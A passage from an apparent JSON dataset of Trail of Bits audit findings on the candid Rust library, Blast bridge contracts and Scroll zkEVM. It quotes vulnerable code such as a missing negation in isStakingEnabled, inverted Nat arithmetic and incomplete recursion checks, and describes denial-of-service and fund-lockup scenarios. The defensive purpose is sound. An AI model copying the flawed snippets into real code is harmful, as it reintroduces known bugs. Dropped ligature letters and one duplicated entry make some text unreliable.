\"service\", \"sign\", \"text\", \"variant\", \"vec\" Figure 8.3: The didc tool cannot encode special oat values. Recommendations Short term, x the display of the -inf and +inf float32 and float64 values so that they do not include the \".0\" sux. Also, consider supporting those values as well as the NaN value in the didc encode tool. Long term, extend the test suite to test for the cases described in this nding.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "9. Incorrect arithmetic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "Certain arithmetic operators (minus, divide, modulo) for the Nat and Int types when the rst argument of the operator is a built-in type are awed. The operators produce values as though the operators' arguments are passed in an inverted order. This issue can be seen in existing tests that check for the incorrect results for those operators (gure 9.1). let x: $t = 1 ; let value = < $res >::from(x + 1 ); /* ... */ assert_eq! (x + value.clone(), 3 ); assert_eq! (x - value.clone(), 1 ); assert_eq! (x * value.clone(), 2 ); assert_eq! (x / value.clone(), 2 ); assert_eq! (x % value.clone(), 0 ); // 1-2 == 1 // 1/2 == 2 // 1%2 == 0 Figure 9.1: Existing (passing) test case checking arithmetic of Nat / Int with awed expected values ( candid/rust/candid/tests/number.rs#L98L116 ) Exploit Scenario A developer writes code that uses the awed arithmetic in a nancial operation, assuming it works correctly. An attacker nds that fact and exploits it to gain some funds. Recommendations Short term, x the implementation of arithmetic operators and the relevant test assertions. Long term, review test cases and expected values to mitigate human error. Where possible, attempt to automate tests so they do not rely on human-provided values.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Inadequate recursion checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The de module uses a check_recursion macro (gure 10.1) to avoid overowing the stack when deserializing. However, the macro is not used outside of the de module, so stack overows can still occur. 202 203 204 205 206 macro_rules! check_recursion { ( $this : ident $($body : tt )*) => { $this .recursion_depth += 1 ; match stacker::remaining_stack() { Some (size) if size < 32768 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}\" , $this .recursion_depth))), 207 None if $this .recursion_depth > 512 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}. Cannot detect stack size, use a conservative bound\" , $this .recursion_depth))), 208 209 210 211 212 213 214 } }; _ => (), } let __ret = { $this $($body )* }; $this .recursion_depth -= 1 ; __ret Figure 10.1: Denition of the check_recursion macro ( candid/rust/candid/src/de.rs#202214 ) The issue is that function stack frame sizes dier. Thus, a function with a small stack frame could recurse N times and not overow the stack. However, the use of that function could be followed by a call to a function with a larger stack frame that, when recursing a similar number of times, does overow the stack. If the check_recursion macro is used only in the former function and not in the latter, a panic will result instead of an error. For example, IDLArgs  Debug implementation (gure 10.2) is recursive. However, it does not use the check_recursion macro. Moreover, experiments suggest it has a larger stack frame size than candid s deserialization functions. Thus, a program could deserialize an IDLArgs value and try to print its Debug representation, resulting in a panic. 250 251 252 253 254 255 256 257 258 259 260 261 262 } impl fmt::Debug for IDLArgs { fn fmt (& self , f: & mut fmt::Formatter<' _ >) -> fmt :: Result { if self .args.len() == 1 { write! (f, \"({:?})\" , self .args[ 0 ]) } else { let mut tup = f.debug_tuple( \"\" ); for arg in self .args.iter() { tup.field(arg); } tup.finish() } } Figure 10.2: Recursive function not involved in deserialization ( candid/rust/candid/src/pretty/candid.rs#250262 ) Appendix E gives an example test showing that the just described scenario is achievable. Exploit Scenario Alice writes a program that uses the candid library. Alices program deserializes values from untrusted sources and prints their Debug representations when an error occurs. Eve uses the technique described above to crash Alices program. Recommendations Short term, adapt IDLArgs  Debug and Display implementations to use the check_recursion macro. Similarly adapt other functions that are known to be recursive and that act on deserialized data. Doing so will eliminate potential denial-of-service vectors. Long term, take the following steps:   Fuzz the candid packages functions regularly. This issue was found by running one of the existing fuzzing harnesses. Fuzzing regularly could help to expose similar issues. Avoid recursion except where specically necessary. Recursion can lead to stack overows and can introduce denial-of-service vectors. (See also TOB-CANDID-4 .)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. TypeId::of functions could be optimized into a single function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The candid library uses the address of a function to identify a type. However, there is no guarantee that the compiler will not optimize those functions into a single function. Hence, the technique could stop working at any time. The relevant code appears in gure 11.1. The general technique appears to have been introduced in rust-lang/rust issue #41875 . However, several problems with the technique are pointed out in that issue, including the one in this ndings title . impl TypeId { pub fn of <T: ? Sized >() -> Self { let name = std::any::type_name::<T>(); TypeId { id: TypeId ::of::<T> as usize , name, } } 15 16 17 18 19 20 21 22 23 } Figure 11.1: TypeId implementation ( candid/rust/candid/src/types/internal.rs#1523 ) Note that the TypeId in gure 11.1 includes a name eld, which the original proposal did not. The inclusion of the name eld provides some protection against optimization. However, the compiler could, in principle, optimize out that eld if it is unread. Even if the eld is read, type names are meant only for diagnostic purposes , and there is no guarantee that they dier across types. Thus, the compiler could collapse TypeId::of for two types meant to be distinct. Exploit Scenario Alice writes a program that uses the candid library. A future version of the compiler collapses the TypeId::of functions for certain types that Alices program uses. Alices program no longer deserializes values correctly. Recommendations Short term, take the following steps:   Conspicuously document that the candid library relies on an unsound TypeId implementation. Doing so will alert users of the possibility that the library may behave incorrectly on certain types. Develop thorough unit, property, and possibly fuzzing tests to check for distinct types whose TypeId::of functions are not distinguished by the compiler. Doing so could help alert you to types on which the candid library may behave incorrectly. Long term, keep abreast of proposals to develop a non-static TypeId . If such a proposal is adopted, consider switching to it. Doing so could provide a solution that would not be undermined by the compiler. References   rust-lang/rust issue #41875: Tracking issue for non_static_type_id Pre-RFC: non-footgun non-static TypeId",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Deserialization correctness depends on the thread in which operations are performed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The candid library uses a thread local ENV map to record the types that knot IDs map to. Because the map is thread local, it could fail to be populated in a thread that performs deserialization, causing deserialization of a knot to fail. ENV s declaration appears in gure 12.1. There is no public function to populate ENV outright. Rather, ENV is populated as a side eect of calling the trait method CandidType::ty (gures 12.2 and 12.3). 629 630 thread_local! { static ENV : RefCell <HashMap<TypeId, Type>> = RefCell::new(HashMap::new()); Figure 12.1: Declaration of ENV ( candid/rust/candid/src/types/internal.rs#629630 ) 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 } fn ty () -> Type { let id = Self ::id(); if let Some (t) = self ::internal::find_type(&id) { match *t { TypeInner::Unknown => TypeInner::Knot(id).into(), _ => t, } } else { self ::internal::env_add(id.clone(), TypeInner::Unknown.into()); let t = Self ::_ty(); self ::internal::env_add(id.clone(), t.clone()); self ::internal::env_id(id, t.clone()); t } Figure 12.2: Trait method CandidType::ty ( candid/rust/candid/src/types/mod.rs#3448 ) 646 647 648 } pub ( crate ) fn env_add (id: TypeId , t: Type ) { ENV.with(|e| drop (e.borrow_mut().insert(id, t))); Figure 12.3: Function env_add , which is called by CandidType::ty ( candid/rust/candid/src/types/internal.rs#646648 ) A thread can construct a type that implements CandidType without calling CandidType::ty . If that thread then tries to deserialize that type, the deserialization could fail. Appendix F gives an example demonstrating the problem. Note: We were able to trigger the bug using IDLDeserialize::get_value_with_type , but not otherwise. That method is guarded by the value feature ag, and thus was out of scope of the audit. For that reason, we have given the nding informational severity. If there was a way to trigger the bug without requiring optional features, the ndings severity would be high. Exploit Scenario Alice writes a program that uses the candid library. Alices program uses multiple threads and deserializes values from untrusted sources. Eve discovers a code path that requires Alices program to perform deserialization without calling CandidType::ty . Eve uses the code path to crash Alices program. Recommendations Short term, conspicuously document that the candid library is not thread safe. Moreover, users should not rely on data passed between threads, even when Rusts type system allows it. Doing so will reduce the risk of users misusing candid s API. Long term, eliminate the implicit requirement that CandidType::ty be called for deserialization to work correctly. Adopt an API that makes the population of ENV more explicit. For example, rather than have ENV be a thread local variable, consider storing it inside of a context object. When serializing or deserializing, a user could be required to pass such a context object. By making users responsible for managing such context objects and their respective ENV elds, users are less likely to be surprised by failures at inopportune times.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "13. External GitHub CI actions versions are not pinned ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The GitHub Actions pipelines used in candid and ic-transport-types ( agent-rs repository) use several third-party actions versions that are not pinned to a commit but to a branch or a release tag that can be changed. These actions are part of the supply chain for CI/CD and can execute arbitrary code in the CI/CD pipelines. A security incident in any of the above GitHub accounts or organizations can lead to a compromise of the CI/CD pipelines and any artifacts they produce or any secrets they use. The following actions are owned by GitHub organizations that might not be aliated directly with the API/software they are managing:               EmbarkStudios/cargo-deny-action@v1 South-Paw/action-netlify-deploy@v1.0.4 [archived] actions-rs/cargo@v1 [archived] actions-rs/toolchain@v1 [archived] actions/cache@v2 actions/checkout@master , v1 , v2 , v3 actions/download-artifact@v3 actions/setup-node@v3 actions/upload-artifact@v3 boa-dev/criterion-compare-action@master cachix/install-nix-action@v12 unsplash/comment-on-pr@v1.2.0 ructions/cargo@v1 svenstaro/upload-release-action@v2 Note that we included GitHub actions from the actions organization owned by GitHub even though Dnity already implicitly trusts GitHub by virtue of using their platform. However, if any of their repositories gets hacked, it may impact the Dnitys CI builds. Exploit Scenario A private GitHub account with write permissions for one of the untrusted GitHub actions is taken over by social engineering. For example, a user uses an already-leaked password and is convinced to send a 2FA code to the attacker. The attacker updates the GitHub actions and puts a backdoor in the release artifacts produced by those actions. Recommendations Short term, pin all external and third-party actions to a Git commit hash. Avoid pinning to a Git tag as these can be changed after creation. We also recommend using the pin-github-action tool to manage pinned actions. GitHub dependabot is capable of updating GitHub Actions that use commit hashes. Long term, audit all pinned actions or replace them with a custom implementation. Also, consider updating archived GitHub actions to active ones.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Inconsistent support for types in operators ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "Only a subset of expected functions are implemented for the combination of Nat and i32 types. As a result, the operators work only if Nat is exactly at the left side of the operator. As a result, certain code that could be assumed to compile, does not compile. This is demonstrated in gures 14.12, where the test_i32_Nat test function does not compile. // This test compiles: #[test] fn test_Nat_i32 () { let l : Nat = <Nat>::from( 1 ); let r : i32 = 1 ; let _ = l + r; } // This test fails to compile: #[test] fn test_i32_Nat () { let l : i32 = 1 ; let r : Nat = <Nat>::from( 1 ); let _ = l + r; } Figure 14.1: Two functions calculating sum of two variables of types i32 and Nat in two dierent orders error[E0277]: cannot add `candid::Nat` to ` i32 ` --> rust /candid/tests/playground.rs: 74 : 15 | | | let _ = l + r; ^ no implementation for ` i32 + candid::Nat` Figure 14.2: Compilation error from the code from gure 14.1 When an operator exists for two types, it is expected to work both ways; therefore, both tests are expected to pass. The plus operator shown in gure 14.1 is only an example, and the described issue occurs with other operators as well. Recommendations Short term, implement all operators for Nat and i32 . Consider implementing them for other integer types, as support for only i32 is inconsistent. Long term, write methodically comprehensive tests for every function. Cover all edge cases and potential errors",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "15. Recursion checks do not ensure stack frame size ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The candid package implements the check_recursion macro, which checks for recursion depth and whether the remaining stack size is lower than 32768 bytes. However, there is no guarantee that the stack frame of a function that will be called within the scope of the check_recursion macro will not be bigger than 32768 bytes. If this happens, the check would fail to t its purpose. The severity of this nding is informational because it is unlikely that a stack frame would exceed 32768 bytes. However, we still ag it since this is neither guaranteed nor checked by the code. #[cfg(not(target_arch = \"wasm32\" ))] macro_rules! check_recursion { ( $this : ident $($body : tt )*) => { $this .recursion_depth += 1 ; match stacker::remaining_stack() { Some (size) if size < 32768 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}\" , $this .recursion_depth))), None if $this .recursion_depth > 512 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}. Cannot detect stack size, use a conservative bound\" , $this .recursion_depth))), _ => (), } let __ret = { $this $($body )* }; $this .recursion_depth -= 1 ; __ret }; } Figure 15.1: candid/rust/candid/src/de.rs#L201L214 Recommendations Long term, nd a way to check the stack frame sizes of functions called within the check_recursion macro and ensure that the stack frame size is never greater than what check_recursion checks for. There exists a LLVM ag, emit-stack-sizes , that may help achieve this, although it is unstable. Additionally, document any meaningful information around stack frame sizes so that future readers of the check_recursion macro have more information about its assurances.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Unmaintained dependency in candid_parser ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The candid_parser package relies on serde_dhall , whose README contains the following message: STATUS I am no longer maintaining this project. I got it to support about 90% of the language but then lost faith in the usability of dhall for my purposes. I am willing to hand this over to someone who's excited about dhall and rust. Note that this nding is informational because candid_parser is outside of the audits scope. Exploit Scenario Eve learns of a vulnerability in serde_dhall . Because the package is unmaintained, the vulnerability persists. Eve exploits the vulnerability in candid , knowing that it relies on serde_dhall . Recommendations Short term, adopt one of the following three strategies:    Deprecate support for the dhall format. Seek an alternative implementation of serde_dhall s functionality. (We were unable to nd one.) Take ownership of serde_dhall . Taking one of these steps will eliminate candid_parser s current reliance on an unmaintained dependency. Long term, regularly run cargo-audit and cargo upgrade --incompatible . Doing so will help ensure that the project stays up to date with its dependencies.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Insu\u0000cient linter use ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The Candid project appears to run Clippy with only the default set of lints enabled ( clippy::all ). The maintainers should consider running additional lints, as many of them produce warnings when enabled for the project. Running Clippy with -W clippy::pedantic produces several hundred warnings, indicating that enabling additional lints could have a positive impact on the correctness of the codebase. Examples of such warnings appear in gures 2.1 through 2.3. warning: unnested or-patterns --> rust/candid/src/de.rs:721:13 | 721 | (TypeInner::Null, TypeInner::Opt(_)) | (TypeInner::Reserved, TypeInner::Opt(_)) => { | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ | = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#unnested_or_patterns = note: `-W clippy::unnested-or-patterns` implied by `-W clippy::pedantic` help: nest the patterns | 721 | (TypeInner::Null | TypeInner::Reserved, TypeInner::Opt(_)) => { | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Figure 2.1: Warning produced by the clippy::unnested_or_patterns lint warning: calling `to_string` on `&&str` --> rust/candid/src/error.rs:53:26 | 53 | message: err.to_string(), | ^^^^^^^^^^^^^^^ help: try dereferencing the receiver: `(*err).to_string()` | = help: `&str` implements `ToString` through a slower blanket impl, but `str` has a fast specialization of `ToString` = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#inefficient_to_string = note: `-W clippy::inefficient-to-string` implied by `-W clippy::pedantic` Figure 2.2: Warning produced by the clippy::inefficient_to_string lint warning: it is more concise to loop over references to containers instead of using explicit iteration methods --> rust/candid/src/types/impls.rs:137:18 | 137 | for e in self.iter() { | ^^^^^^^^^^^ help: to write this more concisely, try: `self` | = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#explicit_iter_loop = note: `-W clippy::explicit-iter-loop` implied by `-W clippy::pedantic` Figure 2.3: Warning produced by the clippy::explicit_iter_loop lint Exploit Scenario Eve uncovers a bug in the candid package. The bug would have been caught by Dnity had additional lints been enabled. Recommendations Short term, review all of the warnings currently generated by Clippys pedantic lints. Address those in gures 2.1 through 2.3, and any others for which it makes sense to do so. Taking these steps will produce cleaner code, which in turn will reduce the likelihood that the code contains bugs. Long term, take the following steps:   Consider running Clippy with -W clippy::pedantic regularly. As demonstrated by the warnings in gures 2.1 through 2.3, the pedantic lints provide valuable suggestions. Regularly review Clippy lints that have been allowed to determine whether they should still be given such an exemption. Allowing a Clippy lint unnecessarily could cause bugs to be missed.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Misleading error message ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The length of a vector is checked to be exactly 32, but whenever it is not, a length parity error message is displayed. The message does not describe the error. Additionally, value 32 is a magic number and should be replaced with a named constant. let vec = hex::decode(from).map_err(RequestIdFromStringError::FromHexError)?; if vec.len() != 32 { return Err (RequestIdFromStringError::InvalidSize(vec.len())); } Figure 16.1: Vector length tested to be exactly 32 in from_str function and returning RequestIdFromStringError::InvalidSize with misleading message (see gure 16.2) whenever the length is not 32 ( ic-transport-types/src/request_id.rs#L85L87 ) /// The string was not of a valid length. #[error( \"Invalid string size: {0}. Must be even.\" )] InvalidSize( usize ), Figure 16.2: Error message informing about incorrect string size with additional, unnecessary comment about numbers parity ( ic-transport-types/src/request_id/error.rs#L8L10 ) Recommendations Short term, update the error message to accurately describe the issue and replace the value 32 with a named constant. Long term, use error names that describe errors in detail; if length parity is a concern, add it to the error name instead of using more general naming like InvalidSize . Also, make sure that error messages do not contain any misleading text. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. isStakingEnabled returns true when Lido is paused ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf",
        "body": "The isStakingEnabled function returns true when Lido has paused staking on its system. Instead, it should return false (gure 1.1). /// @inheritdoc YieldProvider function isStakingEnabled ( address token ) public view override returns ( bool ) { return token == address (LIDO) && LIDO.isStakingPaused(); } Figure 1.1: The isStakingEnabled function incorrectly returns the status of whether Lido has paused staking. ( optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-providers/L idoYieldProvider.sol#L53-L56 ) The function should negate the return value of LIDO.isStakingPaused . Recommendations Short term, update the isStakingEnabled function, as shown in gure 1.2: /// @inheritdoc YieldProvider function isStakingEnabled ( address token ) public view override returns ( bool ) { return token == address (LIDO) && !LIDO.isStakingPaused(); } Figure 1.2: This corrected version of the isStakingEnabled function correctly assesses whether Lido is paused. Long term, improve the unit test coverage to validate all getter functions and their expected functionality.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. ETH yield token user deposits lose replay capabilities on the L2 bridge ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf",
        "body": "ETH yield token deposits on the Blast bridge do not use the L1CrossDomainMessenger component to relay the message to L2. As a result, the default transaction replay capabilities provided by the messenger are not available to users. On Optimism, the traditional ow for token deposits is for the L1 bridge to call the L1CrossDomainMessenger.sendMessage function. Internally, the messenger will invoke the OptimismPortal.depositTransaction function, where the calldata for the L2 side is for the L2CrossDomainMessenger.relayMessage function (gure 2.1). The relayMessage function provides transaction replay capabilities if the original transaction fails to execute successfully. These capabilities ensure that users funds do not become locked in the bridge. However, on Blast, ETH yield token deposits, such as deposits of stETH, do not go through the L1CrossDomainMessenger . Instead, they directly go through the OptimismPortal.depositTransaction function (gure 2.1). This function is used because stETH deposits on L1 must result in minted ETH instead of ERC-20 tokens on L2. To access such behavior, the system cannot go through the L1CrossDomainMessenger . Because of this deviation, the callee on L2 is not the L2CrossDomainMessenger.relayMessage function; instead, it is the L2BlastBridge.finalizeETHBridgeDirect function. If this function reverts, the L2 ETH will be locked on the bridge and the user will have no way to gain access to it. function _initiateBridgeERC20 ( address _localToken , address _remoteToken , address _from , address _to , uint256 _amount , uint32 _minGasLimit , bytes memory _extraData ) internal override { YieldToken memory usdYieldToken = usdYieldTokens[_localToken]; YieldToken memory ethYieldToken = ethYieldTokens[_localToken]; if (usdYieldToken.approved) { [...] } else if (ethYieldToken.approved) { [...] // Message has to be sent to the OptimismPortal directly because we have to // request the L2 message has value without sending ETH. portal.depositTransaction( Predeploys.L2_BLAST_BRIDGE, _amount, RECEIVE_DEFAULT_GAS_LIMIT, false , abi.encodeWithSelector( L2BlastBridge.finalizeBridgeETHDirect.selector, _from, _to, USDConversions._convertDecimals(_amount, ethYieldToken.decimals, USDConversions.WAD_DECIMALS), _extraData ) ); [...] } Figure 2.1: ETH yield token deposits bypass the L1CrossDomainMessenger . ( optimism/packages/contracts-bedrock/src/mainnet-bridge/L1BlastBridge.sol #L161-L241 ) Recommendations Short term, update any user- and developer-facing documentation to inform developers that ETH transfers on L2, especially when ETH yield tokens are deposited on L1, must not revert. Long term, formally enumerate the invariants introduced across Blast. This may help prevent invariants from being violated with future changes to code, enable deeper internal security review, and assist external developers. 3. Insu\u0000cient funds may be available for user withdrawals Severity: Low Diculty: Low Type: Data Validation Finding ID: TOB-BLAST-3 Target: optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-provide rs/LidoYieldProvider.sol , optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-provide rs/DSRYieldProvider.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. ETH yield token user deposits lose replay capabilities on the L2 bridge ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf",
        "body": "ETH yield token deposits on the Blast bridge do not use the L1CrossDomainMessenger component to relay the message to L2. As a result, the default transaction replay capabilities provided by the messenger are not available to users. On Optimism, the traditional ow for token deposits is for the L1 bridge to call the L1CrossDomainMessenger.sendMessage function. Internally, the messenger will invoke the OptimismPortal.depositTransaction function, where the calldata for the L2 side is for the L2CrossDomainMessenger.relayMessage function (gure 2.1). The relayMessage function provides transaction replay capabilities if the original transaction fails to execute successfully. These capabilities ensure that users funds do not become locked in the bridge. However, on Blast, ETH yield token deposits, such as deposits of stETH, do not go through the L1CrossDomainMessenger . Instead, they directly go through the OptimismPortal.depositTransaction function (gure 2.1). This function is used because stETH deposits on L1 must result in minted ETH instead of ERC-20 tokens on L2. To access such behavior, the system cannot go through the L1CrossDomainMessenger . Because of this deviation, the callee on L2 is not the L2CrossDomainMessenger.relayMessage function; instead, it is the L2BlastBridge.finalizeETHBridgeDirect function. If this function reverts, the L2 ETH will be locked on the bridge and the user will have no way to gain access to it. function _initiateBridgeERC20 ( address _localToken , address _remoteToken , address _from , address _to , uint256 _amount , uint32 _minGasLimit , bytes memory _extraData ) internal override { YieldToken memory usdYieldToken = usdYieldTokens[_localToken]; YieldToken memory ethYieldToken = ethYieldTokens[_localToken]; if (usdYieldToken.approved) { [...] } else if (ethYieldToken.approved) { [...] // Message has to be sent to the OptimismPortal directly because we have to // request the L2 message has value without sending ETH. portal.depositTransaction( Predeploys.L2_BLAST_BRIDGE, _amount, RECEIVE_DEFAULT_GAS_LIMIT, false , abi.encodeWithSelector( L2BlastBridge.finalizeBridgeETHDirect.selector, _from, _to, USDConversions._convertDecimals(_amount, ethYieldToken.decimals, USDConversions.WAD_DECIMALS), _extraData ) ); [...] } Figure 2.1: ETH yield token deposits bypass the L1CrossDomainMessenger . ( optimism/packages/contracts-bedrock/src/mainnet-bridge/L1BlastBridge.sol #L161-L241 ) Recommendations Short term, update any user- and developer-facing documentation to inform developers that ETH transfers on L2, especially when ETH yield tokens are deposited on L1, must not revert. Long term, formally enumerate the invariants introduced across Blast. This may help prevent invariants from being violated with future changes to code, enable deeper internal security review, and assist external developers.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Insu\u0000cient funds may be available for user withdrawals ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf",
        "body": "The Lido and DSR yield providers might stake more funds than what is available, which could prevent user withdrawals from being nalized. The LidoYieldProvider and DSRYieldProvider contracts are responsible for staking funds that are available in their respective yield managers into Lido and the DSR pot, respectively. For example, the LidoYieldProvider.stake function rst checks that the amount of funds to stake is less than the available ETH balance in the ETHYieldManager (gure 3.1). Then, the function calls Lido to stake the necessary amount. /// @inheritdoc YieldProvider function stake ( uint256 amount ) external override onlyDelegateCall { if ( amount > YIELD_MANAGER.lockedValue() ) { revert InsufficientStakableFunds(); } LIDO.submit{value: amount}( address ( 0 )); } Figure 3.1: The stake function may stake more funds than what is available in the ETHYieldManager . ( optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-providers/L idoYieldProvider.sol#L73-L79 ) However, the function does not take into account the amount of ETH that is locked by the WithdrawalQueue to complete any outstanding withdrawals. Thus, the Blast admin could stake more than the available liquidity in the ETHYieldManager . Doing so would aect the solvency of the bridge temporarily since users may be unable to nalize their withdrawals. Note that this issue also exists in the DSRYieldManager . Exploit Scenario Alice, the Blast admin, calls the ETHYieldManager.stake function with an amount that is more than what is available (including locked funds for withdrawals). Bob, a user of Blast, attempts to nalize his withdrawal request but is unable to do so because there are not enough funds left in the ETHYieldManager . Recommendations Short term, update the LidoYieldProvider.stake (gure 3.2) and DSRYieldProvider.stake (gure 3.3) functions as follows: /// @inheritdoc YieldProvider function stake ( uint256 amount ) external override onlyDelegateCall { if ( amount > YIELD_MANAGER.getTokenBalance() ) { revert InsufficientStakableFunds(); } LIDO.submit{value: amount}( address ( 0 )); } Figure 3.2: This corrected version of the LidoYieldProvider.stake function ensures that only liquid funds are used for staking. /// @inheritdoc YieldProvider function stake ( uint256 amount ) external override onlyDelegateCall { if ( amount > YIELD_MANAGER.getTokenBalance() ) { revert InsufficientStakableFunds(); } if (amount > 0 ) { DSR_MANAGER.join( address (YIELD_MANAGER), amount); } } Figure 3.3: This corrected version of the DSRYieldProvider.stake function ensures that only liquid funds are used for staking. Long term, document all invariants of the system, including those pertaining to token accounting and solvency. Ensure that testing can validate these invariants and cover all edge cases.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Possible denial-of-service vector through pre-deployed contract storage writes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf",
        "body": "Blast tracks share prices and counts for each account address using pre-deployed contracts that are set within the chains genesis block. As the EVM executes a transaction, it uses Blasts GasTracker provider to track gas rewards to disperse to developers. The refund provided on gas oers an incentive for developers to adopt Blast as their L2 solution. However, Blasts pre-deployed contracts getter and setter functions for these parameters use Ethereum account storage. Because storage writes are computationally expensive operations (due to the triggering of expensive account trie updates), the pre-deployed contracts should charge an appropriate amount in gas costs for each storage write to nancially disincentivize attackers from leveraging them as a denial-of-service attack vectors, slowing down transaction processing rates. Currently, Blast performs multiple account storage writes per unique contract address executed during a transaction. Thus, an attacker may attempt to perform a long list of calls in a transaction in an attempt to trigger storage writes. They may perform more calls than the maximum stack depth by adding a depth limit and iterating over a list of contracts at each depth level. The severity of this issue is undetermined, as the feasibility of this attack was not determined during the course of this review. We rated the attack complexity as high for the following reasons:    Contract deployments will be costly to the attacker. Performing the call afterwards will add additional nancial overhead for the attacker, due to the number of calls performed. There must be a nancial incentive to perform a denial-of-service attack that produces a larger return than the money spent. When considering practical attack scenarios, note that some systems involving the pooling of assets (e.g., a liquidity pool) and uctuating asset pricing based on availability may provide an incentive, if an attacker can disallow other users from funding a pool for some time. Recommendations Short term, evaluate the total aggregate cost of such attacks for a given number of contracts/calls to determine whether any attacks may be nancially feasible. This could be done by subtracting the cost of the storage write operations from the amount refunded, but in practice, some refunds may not cover the cost fully. Doing so would only narrow the constraints for such attacks and may not eliminate them. As a result of design constraints within Blast, it may be dicult to nd viable solutions. Blast holds interest in maintaining EVM compliance such that traditional gas costs that inuence the number of instructions that will be executed before gas runs out will not be violated. As a result, Blasts gas refunds were developed to occur alongside traditional Ethereum gas computations and are applied only at the end of transactions. Otherwise, the most ideal solution would be to immediately charge for the storage writes or ensure that enough gas is provided to account for them so that they are always accounted for. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Use of account_hash_traces cells does not match specication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
